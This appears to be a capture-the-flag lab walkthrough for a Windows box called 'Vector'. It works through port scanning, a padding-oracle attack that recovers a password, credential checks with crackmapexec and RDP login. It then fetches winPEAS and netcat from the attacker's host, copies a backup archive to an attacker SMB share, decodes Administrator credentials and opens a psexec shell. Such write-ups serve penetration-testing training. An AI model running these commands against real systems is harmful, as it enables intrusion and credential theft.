@@ -1,0 +1,192 @@
+																			                        Vector Walkthrough
+																																							
+Attacker's Machine: 192.168.45.243 
+Victim's Machine: 192.168.205.119
+export IP=192.168.205.119
+
+nmapAutomator.sh -H $IP -t Full
+
+PORT     STATE SERVICE       VERSION
+21/tcp   open  ftp           Microsoft ftpd
+80/tcp   open  http          Microsoft IIS httpd 10.0
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp  open  microsoft-ds  Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
+2290/tcp open  http          Microsoft IIS httpd 10.0
+3389/tcp open  ms-wbt-server Microsoft Terminal Services
+5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+Service Info: OSs: Windows, Windows Server 2008 R2 - 2012
+
+Enumeration & Discovery
+
+21                                        # Nothing here
+139,445                                # Nothing here
+80
+
+http://192.168.205.119/                       # Login page
+
+2290
+http://192.168.205.119:2290/              # ERROR: missing parameter "c"
+
+# View source code
+
+AES-256-CBC-PKCS7 ciphertext: 4358b2f77165b5130e323f067ab6c8a92312420765204ce350b1fbb826c59488
+Victor's TODO: Need to add authentication eventually..
+
+# Potential username, Victor
+
+# Let's add a c parameter to see what's going on
+
+http://192.168.205.119:2290/?c=1
+
+
+
+# ok, we get a 0 responde. No matter what we place in the C parameter as a value, we get a zero responde. 
+   However, if we add the ciphertext as the value for c parameter, we get a 1 responde.
+   
+http://192.168.205.119:2290/?c=4358b2f77165b5130e323f067ab6c8a92312420765204ce350b1fbb826c59488
+
+
+
+# Not sure how this is relevant, but w/e. 
+  Let's try to decode the cipher. https://www.dcode.fr/sha256-hash
+  
+  
+  
+# Azerty, maybe this is a password or some shit. Let's try to login in on port 21, 445 and 80. Maybe we get lucky ?
+
+Victor / azerty
+
+port 80 - invalid credentials
+port 445 - nothing
+port 21 - nothing
+port 3389 - nothing
+
+# Back to searching online for way to decrypt the cipher
+
+decrypt AES-256-CBC-PKCS7 "asp.net" github 
+
+https://learn.microsoft.com/en-us/dotnet/standard/security/vulnerabilities-cbc-mode
+
+# Ok, let's search for padding attacks for ASP.NET applications
+
+decrypt AES-256-CBC-PKCS7 "asp.net" github 
+
+
+
+https://github.com/mpgn/Padding-oracle-attack
+
+# Download the exploit.py and try to run it against our cipher value.
+
+python exploit.py -c <cipher_value> -l <8 or 16> --host host.com -u /index.aspx?c= -v --error "Padding Error"
+
+# We've got already pretty much everything, but we need the proper error message that the application gives so that our script may work properly.
+    Place an invalid payload in the C parameter and view the source code.
+    
+    
+
+# When you have an invalid value in the C parameter, we get the error message <span id="MyLabel">0</span>  while when we have a correct value we get <span id="MyLabel">1</span>
+  Let's use the error message for our exploit.
+  
+python exploit.py -c 4358b2f77165b5130e323f067ab6c8a92312420765204ce350b1fbb826c59488 -l 16 --host 192.168.205.119:2290 -u /?c= -v --error ‘<span id="MyLabel">0</span>’
+
+
+
+# Possible password, WormAloeVat7
+    Again, let's check all services, maybe we get some hits on them.
+    
+port 80 - invalid credentials
+port 445
+
+enum4linux -u Victor -p WormAloeVat7 -a $IP
+
+Sharename       Type      Comment
+---------           ----      -------
+ADMIN$          Disk      Remote Admin
+C$                  Disk      Default share
+IPC$               IPC       Remote IPC
+
+crackmapexec smb $IP -u Victor -p WormAloeVat7 --shares
+SMB         192.168.205.119 445    VECTOR           [*] Windows Server 2019 Standard 17763 x64 (name:VECTOR) (domain:vector) (signing:False) (SMBv1:True)
+SMB         192.168.205.119 445    VECTOR           [+] vector\Victor:WormAloeVat7 
+SMB         192.168.205.119 445    VECTOR           [+] Enumerated shares
+SMB         192.168.205.119 445    VECTOR           Share           Permissions     Remark
+SMB         192.168.205.119 445    VECTOR           -----           -----------     ------
+SMB         192.168.205.119 445    VECTOR           ADMIN$                          Remote Admin
+SMB         192.168.205.119 445    VECTOR           C$                              Default share
+SMB         192.168.205.119 445    VECTOR           IPC$                            Remote IPC
+
+# Nothing really usefull, let's try FTP and RDP and winRM.
+
+FTP - valid credentials, but it's empty!
+
+crackmapexec winrm $IP -u Victor -p WormAloeVat7
+SMB         192.168.205.119 5985   VECTOR           [*] Windows 10.0 Build 17763 (name:VECTOR) (domain:vector)
+HTTP        192.168.205.119 5985   VECTOR           [*] http://192.168.205.119:5985/wsman
+WINRM       192.168.205.119 5985   VECTOR           [-] vector\Victor:
+
+
+
+# Last resort, RDP. It this doesn't work, i'm jumping out the window
+
+crackmapexec rdp $IP -u Victor -p WormAloeVat7
+RDP         192.168.205.119 3389   VECTOR           [*] Windows 10 or Windows Server 2016 Build 17763 (name:VECTOR) (domain:vector) (nla:True)
+RDP         192.168.205.119 3389   VECTOR           [-] vector\Victor:WormAloeVat7
+
+# Let's try with xfreerdp anyway. But things are looking grim
+
+xfreerdp /v:$IP /u:Victor /p:WormAloeVat7 /cert:ignore /dynamic-resolution +clipboard
+
+# it worked, grab the flag and go for privesc.
+
+ee109316f522a65b6ac5912832b250f7
+
+Privilege Escalation
+
+# Aparently we are too limited on cmd usage, so let's switch to powershell
+
+IWR -Uri http://192.168.45.243/winPEASx64.exe -OutFile winPEASx64.exe
+IWR -Uri http://192.168.45.243/nc64.exe -OutFile nc64.exe
+
+# RUnning winpeas we notice some interesting logs.
+
+
+
+# Ok, let's try the credentials, open CMD and run as administrator 
+
+
+
+# easy, get the flag
+
+3a07f7d31e57081b92e2a19ed2d1e7b5
+
+
+Privesc 2
+
+# Check the downloads folder of user Victor
+
+cd C:\Users\victor\Downloads
+dir
+-a----        7/21/2020   9:59 AM            286 backup.rar
+
+# Let's download the rar file on our machine using smb server. For some reason when we are using smb2 it doesn't work so let's use smb1.
+
+python3 /usr/share/doc/python3-impacket/examples/smbserver.py urs .
+
+copy C:\Users\victor\Downloads\backup.rar \\192.168.45.243\urs
+
+# Extract the contents of the archive
+
+unrar e backup.rar
+cat backup.txt
+QWRtaW5pc3RyYXRvcjpFdmVyeXdheUxhYmVsV3JhcDM3NQ==
+
+echo QWRtaW5pc3RyYXRvcjpFdmVyeXdheUxhYmVsV3JhcDM3NQ== | base64 -d
+
+Administrator:EverywayLabelWrap375 
+
+# Login on the system with the new credentials
+
+impacket-psexec Administrator:'EverywayLabelWrap375'@$IP
